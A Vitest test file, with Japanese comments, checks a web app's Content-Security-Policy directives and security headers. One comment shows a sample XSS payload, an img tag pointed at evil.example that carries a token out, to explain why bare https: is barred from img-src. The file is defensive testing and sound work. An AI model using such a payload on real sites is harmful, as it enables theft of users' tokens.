import { describe, expect, it } from 'vitest'
import { buildContentSecurityPolicy, securityHeaders } from '@/lib/security/csp'

function directive(name: string): string {
  const csp = buildContentSecurityPolicy()
  const found = csp.split('; ').find((part) => part.startsWith(`${name} `) || part === name)
  if (!found) throw new Error(`${name} が CSP に含まれていません: ${csp}`)
  return found
}

describe('Content-Security-Policy', () => {
  // XSS 時に <img src="https://evil.example/?t=トークン"> でトークンを持ち出せてしまうため、
  // img-src に裸の https: を戻してはいけない
  it('img-src は全 https ホストを許可しない', () => {
    const img = directive('img-src')
    expect(img.split(' ')).not.toContain('https:')
  })

  it('img-src は API と R2（redirect 先）を許可する', () => {
    const img = directive('img-src')
    expect(img).toContain('https://image-palace-api.fly.dev')
    expect(img).toContain('https://*.r2.cloudflarestorage.com')
    // LQIP の data URL と html-to-image の blob URL に必要
    expect(img).toContain('data:')
    expect(img).toContain('blob:')
  })

  // CDN_BASE_URL を設定した瞬間に画像 URL が cdn へ変わる。
  // 許可が後回しになると画像が一斉にブロックされるため、先に入れておく
  // 記事の絵は、こちらに保存せずあちらから直に出す。
  // ここに載せていないと、CSP に止められて**枠だけが残る**
  it('img-src は Wikipedia の画像置き場を許可する', () => {
    expect(directive('img-src')).toContain('https://upload.wikimedia.org')
  })

  it('img-src は CDN と新 API ドメインを許可する', () => {
    const img = directive('img-src')
    expect(img).toContain('https://cdn.imagepalace.app')
    expect(img).toContain('https://api.imagepalace.app')
  })

  // 移行中に片方だけにすると、切り替えの前後どちらかで通信が弾かれる
  it('移行中は新旧どちらの API ドメインも許可する', () => {
    const connect = directive('connect-src')
    expect(connect).toContain('https://image-palace-api.fly.dev')
    expect(connect).toContain('https://api.imagepalace.app')
  })

  it('通信先を絞る（connect-src に裸の https: を含めない）', () => {
    const connect = directive('connect-src')
    expect(connect.split(' ')).not.toContain('https:')
    expect(connect).toContain('https://image-palace-api.fly.dev')
  })

  it('基本の防御ディレクティブを維持する', () => {
    expect(directive('default-src')).toBe("default-src 'self'")
    expect(directive('object-src')).toBe("object-src 'none'")
    expect(directive('frame-ancestors')).toBe("frame-ancestors 'none'")
    expect(directive('base-uri')).toBe("base-uri 'self'")
    expect(directive('form-action')).toBe("form-action 'self'")
    // blob: の Worker が default-src へフォールバックして壊れないよう明示している
    expect(directive('worker-src')).toBe("worker-src 'self' blob:")
  })

  it('セキュリティヘッダーを維持する', () => {
    const keys = securityHeaders.map((h) => h.key)
    expect(keys).toEqual(
      expect.arrayContaining([
        'X-Frame-Options',
        'X-Content-Type-Options',
        'Referrer-Policy',
        'Permissions-Policy',
      ])
    )
  })
})
